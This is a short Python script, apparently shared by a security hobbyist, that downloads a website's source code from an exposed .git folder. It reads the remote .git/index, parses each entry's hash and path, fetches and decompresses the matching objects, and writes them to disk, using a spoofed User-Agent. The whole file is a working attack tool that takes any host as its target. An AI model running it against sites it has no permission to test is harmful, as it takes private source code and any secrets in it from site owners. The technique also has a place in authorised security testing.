#!/usr/bin/python
#
# source code dumper from .git folder 
# author: MERRON (https://twitter.com/MERR0N)
#
import struct, mmap, binascii, collections, urllib, sys, os, re

def read(format):
  format = "! " + format
  bytes = f.read(struct.calcsize(format))
  return struct.unpack(format, bytes)[0]

if len(sys.argv) < 2:
  print("Example: python {} site.com".format(sys.argv[0]))
  sys.exit()
  
host = sys.argv[1]
url = "http://{}/.git/index".format(host)
urllib.URLopener.version = 'Mozilla/5.0 (compatible; MSIE 20.5; Windows NT5.0; 23121)'
resp = urllib.urlopen(url)
print(url)
if resp.getcode() == 200:
  content = urllib.URLopener()
  content.retrieve(url, 'index')
else:
  print(".git/index not found")
  sys.exit()

index_file = open('index', 'rb')
f = mmap.mmap(index_file.fileno(), 0, access=1)
index = collections.OrderedDict()
index["signature"] = f.read(4).decode("ascii")
index["version"] = read("I")
index["entries"] = read("I")

for n in range(index["entries"]):
  entry = collections.OrderedDict()
  entry["entry"] = n + 1
  nuls = f.read(40)
  entry["sha1"] = binascii.hexlify(f.read(20)).decode("ascii")
  entry["flags"] = read("H")
  stage_one = bool(entry["flags"] & (0b00100000 << 8))
  stage_two = bool(entry["flags"] & (0b00010000 << 8))
  entry["stage"] = stage_one, stage_two
  namelen = entry["flags"] & 0xFFF
  entrylen = 62
  
  if namelen < 0xFFF:
    entry["name"] = f.read(namelen).decode("utf-8", "replace")
    entrylen += namelen
  else:
    name = []
    while True:
      byte = f.read(1)
      if byte == "\x00":
        break
      name.append(byte)
    entry["name"] = b"".join(name).decode("utf-8", "replace")
    entrylen += 1
    
  padlen = (8 - (entrylen % 8)) or 8
  nuls = f.read(padlen)
  
  download_url = "http://{}/.git/objects/{}/{}".format(host, entry["sha1"][:2], entry["sha1"][2:])
  filename = "{}/{}".format(host, entry["name"].encode('ascii','ignore'))
  print(download_url)
  resp = urllib.urlopen(download_url)
  if resp.getcode() == 200:
    file = resp.read()
    dir = os.path.dirname(filename)
    if(not os.path.isdir(dir)):    
      os.makedirs(dir)
    to_file = open(filename, 'w+')
    file_body = re.sub(r"blob [0-9]{0,}\0", "", file.decode('zlib'))
    to_file.write(file_body.lstrip("\0"))
    print('+', filename)
    to_file.close()
